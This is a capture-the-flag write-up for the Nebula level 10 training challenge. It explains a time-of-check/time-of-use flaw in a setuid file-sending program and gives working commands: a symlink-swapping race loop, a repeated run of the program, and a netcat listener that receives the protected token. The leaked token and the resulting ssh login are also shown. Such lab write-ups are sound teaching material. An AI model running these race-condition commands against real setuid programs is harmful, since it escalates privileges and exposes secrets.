@@ -1,0 +1,207 @@
+Question URL: https://exploit.education/nebula/level-10/
+
+Source code: flag10
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc < 3) {
+      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
+      exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];
+
+      printf("Connecting to %s:18211 .. ", host); fflush(stdout);
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+
+      memset(&sin, 0, sizeof(struct sockaddr_in));
+      sin.sin_family = AF_INET;
+      sin.sin_addr.s_addr = inet_addr(host);
+      sin.sin_port = htons(18211);
+
+      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
+          printf("Unable to connect to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+
+#define HITHERE ".oO Oo.\n"
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf("Unable to write banner to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE
+
+      printf("Connected!\nSending file .. "); fflush(stdout);
+
+      ffd = open(file, O_RDONLY);
+      if(ffd == -1) {
+          printf("Damn. Unable to open file\n");
+          exit(EXIT_FAILURE);
+      }
+
+      rc = read(ffd, buffer, sizeof(buffer));
+      if(rc == -1) {
+          printf("Unable to read from file: %s\n", strerror(errno));
+          exit(EXIT_FAILURE);
+      }
+
+      write(fd, buffer, rc);
+
+      printf("wrote file!\n");
+
+  } else {
+      printf("You don't have access to %s\n", file);
+  }
+}
+
+Information gaethering:
+a. flag10 program under /home/flag10 has setuid set and there is a token file which is readable only by flag10 user
+level10@nebula:/home/flag10$ ls -al flag10 token
+-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
+-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
+
+b. flag10 program requires two parameters. One for a filename and the other for a server IP listening on tcp port 18211
+level10@nebula:/home/flag10$ ./flag10 token 127.0.0.1
+You don't have access to token  <- By access() function which check real uid, not effective uid, of calling this program, level10 user 
+cannot read toke file.
+level10@nebula:/home/flag10$ ./flag10 /tmp/fake_token 127.0.0.1
+Connecting to 127.0.0.1:18211 .. Unable to connect to host 127.0.0.1 <- If the file is readable by level10 user, the program tries to
+make connection to a specified server on port 18211
+
+Background Knowledge:
+a. access function
+- int access(const char *pathname, int mode)
+- access()  checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.
+  The check is done using the calling process's real  UID  and  GID,  rather than  the  effective  IDs as is done when actually 
+  attempting an operation (e.g., open(2)) on the file.  This allows set-user-ID programs  to  easily determine the invoking user's 
+  authority.
+  If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for a  regular  file  if 
+  execute  permission  is enabled for any of the file owner, group, or other.
+  
+b. Code vulnerability
+- From the line 27 of the above code, if(access(argv[1], R_OK) == 0), the program checks the actual invoking user and the step is only
+  used as a gatekeeper. Once the gatekeeper checking process (Time Of Check) is passed, the program simply reads a file (Time Of Read), (line 57: ffd = open(file, O_RDONLY))
+  with the privilege of effective user(flag10 user). We can exploit this vulnerability by using Race Condition of the input file read.
+- Race Condtion setup
+  We can continuouly make symbolic link against /home/flag10/token to /home/level10/lns_file and delete the symbolic link and create another symbolic
+  link against /tmp/fake_toke to /home/level10/lns_file and delete it over and over.
+  Now we run flag10 program infinitevely with /home/level10/lns_file as input file. When the time is right, flag10 will use /tmp/fake_token
+  (which is readable) to pass access() step and read (/home/flag10/token)
+  
+Sol.
+a. Create a level10 readable file 
+echo "fake token" > /tmp/fake_token
+
+b. Local Server setup listening on port 18211 (Use nc. -k: Don't close this server, -l port: Specify listening port)
+level10@nebula:~$ nc -kl 18211
+
+c. Race condition setup - Use while loop
+level10@nebula:~$ while true; do ln -sf /home/flag10/token lns_file; ln -sf /tmp/fake_token lns_file; done &
+[2] 1909
+** ln -s: Symbolic link, -f: remove existing destination files **
+
+d. Call flag10 program infinitively with the input file, lns_file.
+while true; do /home/flag10/flag10 lns_file 127.0.0.1; done
+
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+You don't have access to lns_file
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+You don't have access to lns_file
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+You don't have access to lns_file
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+You don't have access to lns_file
+You don't have access to lns_file
+Connecting to 127.0.0.1:18211 .. Connected!
+Sending file .. wrote file!
+
+## Server side ##
+level10@nebula:~$ nc -kl 18211
+
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+fake token
+.oO Oo.
+fake token
+.oO Oo.
+fake token
+.oO Oo.
+fake token
+.oO Oo.
+fake token
+.oO Oo.
+fake token
+
+e. Log on as flag10 by using the found token 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+level10@nebula:~$ ssh flag10@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/\___/_.___/\__,_/_/\__,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of "levelXX" and password "levelXX", where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+flag10@127.0.0.1's password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+flag10@nebula:~$ id
+uid=989(flag10) gid=989(flag10) groups=989(flag10)
+flag10@nebula:~$ getflag
+You have successfully executed getflag on a target account
+
+  
